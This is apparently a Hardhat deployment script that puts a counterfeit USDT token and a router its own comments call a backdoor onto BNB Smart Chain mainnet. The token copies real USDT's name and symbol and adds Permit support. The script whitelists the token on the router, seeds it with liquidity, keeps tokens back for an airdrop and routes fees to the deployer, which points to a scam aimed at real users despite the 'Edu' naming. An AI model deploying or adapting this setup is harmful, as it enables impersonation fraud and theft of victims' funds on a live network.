const { ethers } = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log("Deployer:", deployer.address);
  console.log("Balance:", ethers.formatEther(await ethers.provider.getBalance(deployer.address)), "BNB\n");

  // 1. 部署假 USDT — 名字/Symbol 跟真实 USDT 一致，带 ERC20Permit
  const Token = await ethers.getContractFactory("EduToken");
  const token = await Token.deploy(ethers.parseEther("1000000000")); // 10亿
  await token.waitForDeployment();
  const tokenAddr = await token.getAddress();
  console.log("Fake USDT deployed to:", tokenAddr);
  console.log("  Name:", await token.name());
  console.log("  Symbol:", await token.symbol());
  console.log("  Total Supply:", ethers.formatEther(await token.totalSupply()));

  // 2. 部署 EduSwap 后门路由
  const Router = await ethers.getContractFactory("EduSwap");
  const router = await Router.deploy("EduSwap");
  await router.waitForDeployment();
  const routerAddr = await router.getAddress();
  console.log("\nEduSwap deployed to:", routerAddr);

  // 3. 白名单登记假 USDT
  await router.listToken(tokenAddr);
  console.log("Listed fake USDT on router");

  // 4. 给 router 转一些代币作流动性
  await token.transfer(routerAddr, ethers.parseEther("100000"));
  console.log("Seeded router with 100,000 USDT");

  // 5. 给空投留点余额
  const deployerBal = await token.balanceOf(deployer.address);
  console.log("Deployer balance:", ethers.formatEther(deployerBal), "USDT");

  console.log("\n=== Config ===");
  console.log(JSON.stringify({
    network: "bscMainnet",
    chainId: 56,
    FakeUSDT: tokenAddr,
    EduSwap: routerAddr,
    feeTo: deployer.address,
  }, null, 2));
}

main().catch((e) => { console.error(e); process.exit(1); });
